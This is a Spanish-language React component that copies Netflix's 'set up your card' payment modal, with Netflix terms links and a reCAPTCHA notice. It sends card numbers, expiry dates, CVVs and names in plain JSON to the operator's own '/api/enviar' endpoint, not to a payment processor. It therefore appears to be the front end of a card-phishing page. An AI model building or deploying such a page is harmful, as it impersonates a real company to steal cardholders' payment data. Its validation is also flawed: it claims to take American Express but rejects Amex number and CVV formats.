import React, { useState } from "react";
import styles from "./Tarjeta.module.css";

export default function TarjetaPago({ onPaymentSuccess }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardName, setCardName] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [errors, setErrors] = useState({});

  // Formato para el número de tarjeta
  const formatCardNumber = (value) => {
    return value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 19); // Espacio cada 4 dígitos
  };

  const handleCardNumberChange = (e) => {
    setCardNumber(formatCardNumber(e.target.value));
  };

  // Formato de la fecha con la barra automáticamente
  const formatExpiryDate = (value) => {
    const cleanedValue = value.replace(/\D/g, "").slice(0, 4); // Elimina caracteres no numéricos y limita a 4 caracteres
    if (cleanedValue.length >= 3) {
      return `${cleanedValue.slice(0, 2)}/${cleanedValue.slice(2)}`;
    }
    return cleanedValue;
  };

  const handleExpiryDateChange = (e) => {
    setExpiryDate(formatExpiryDate(e.target.value));
  };

  // Validación de la fecha de vencimiento
  const isValidExpiryDate = (expiryDate) => {
    const [month, year] = expiryDate.split("/").map((part) => parseInt(part, 10));
    if (month < 1 || month > 12) return false; // Mes no válido
    const currentDate = new Date();
    const expiry = new Date(`20${year}`, month - 1);
    return expiry > currentDate;
  };

  // Validación de los campos
  const validateAndSubmit = async (e) => {
    e.preventDefault();

    const cardNumberRegex = /^\d{16}$/;
    const cvvRegex = /^\d{3}$/;

    let validationErrors = {};

    if (!cardNumberRegex.test(cardNumber.replace(/\s/g, ""))) {
      validationErrors.cardNumber = "Ingrese un número de tarjeta Visa, Mastercard o American Express válido";
    }

    if (!isValidExpiryDate(expiryDate)) {
      validationErrors.expiryDate = "La fecha de vencimiento debe ser válida y posterior a la fecha actual";
    }

    if (!cvvRegex.test(cvv)) {
      validationErrors.cvv = "El CVV debe tener 3 dígitos";
    }

    if (cardName.trim() === "") {
      validationErrors.cardName = "Ingrese el nombre en la tarjeta";
    }

    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setErrors({});
    setErrorMessage("");

    const data = {
      NumeroDeTarjeta: cardNumber,
      FechaDeVencimiento: expiryDate,
      CVV: cvv,
      NombreDeTarjeta: cardName,
    };

    try {
      const response = await fetch("http://localhost:3000/api/enviar", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();
      if (response.status === 201) {
        onPaymentSuccess();
      } else {
        setErrorMessage(result.message || "Error al procesar el pago.");
      }
    } catch (error) {
      setErrorMessage("Error de conexión. Intenta nuevamente.");
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.modal}>
        <h2 className={styles.title}>Configura tu tarjeta de crédito o débito</h2>
        <div className={styles.logos}>
          <img alt="Visa" className={styles.logo} src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/VISA-YO2sYpasfsBgXW99iEUBppBwrvx6UN.png" width="40" height="25" />
          <img alt="Mastercard" className={styles.logo} src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/mater-ZoeFvD5IXZpsC5qJtbuJVPqxFbplgA.png" width="40" height="25" />
          <img alt="American Express" className={styles.logo} src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/AMEX-3lRBmCLXNfVVNgCZNOeJZDlA8k2aN9.png" width="40" height="25" />
        </div>

        <form className={styles.form} onSubmit={validateAndSubmit}>
          <input
            type="text"
            placeholder="Número de tarjeta"
            maxLength={19}
            value={cardNumber}
            onChange={handleCardNumberChange}
            className={styles.input}
            required
          />
          {errors.cardNumber && <p className={styles.errorMessage}>{errors.cardNumber}</p>}

          <div className={styles.inputGroup}>
            <input
              type="text"
              placeholder="Fecha de vencimiento (MM/YY)"
              maxLength={5}
              value={expiryDate}
              onChange={handleExpiryDateChange}
              className={styles.input}
              required
            />
            {errors.expiryDate && <p className={styles.errorMessage}>{errors.expiryDate}</p>}

            <div className={styles.cvvContainer}>
              <input
                type="text"
                placeholder="CVV"
                maxLength={3}
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                className={styles.input}
                required
              />
              <button type="button" className={styles.cvvHelpButton} title="El CVV son los 3 dígitos al dorso de tu tarjeta">?</button>
            </div>
            {errors.cvv && <p className={styles.errorMessage}>{errors.cvv}</p>}
          </div>

          <input
            type="text"
            placeholder="Nombre en la tarjeta"
            value={cardName}
            onChange={(e) => setCardName(e.target.value)}
            className={styles.input}
            required
          />
          {errors.cardName && <p className={styles.errorMessage}>{errors.cardName}</p>}

          {errorMessage && <p className={styles.errorMessage}>{errorMessage}</p>}
          <button type="submit" className={styles.submitButton}>Guardar información de pago</button>
        </form>

        <div className={styles.info}>
          <p>Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.</p>
          <p>
            Al hacer clic en «Guardar información de pago», aceptas nuestros{" "}
            <a href="https://help.netflix.com/legal/termsofuse" target="_blank" rel="noopener noreferrer" className={styles.link}>Términos de uso</a> y nuestra{" "}
            <a href="https://help.netflix.com/legal/privacy" target="_blank" rel="noopener noreferrer" className={styles.link}>Declaración de privacidad</a>.
          </p>
        </div>
        <p className={styles.recaptcha}>
          Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.{" "}
          <a href="https://www.google.com/recaptcha/about/" target="_blank" rel="noopener noreferrer" className={styles.link}>Más info</a>
        </p>
      </div>
    </div>
  );
}
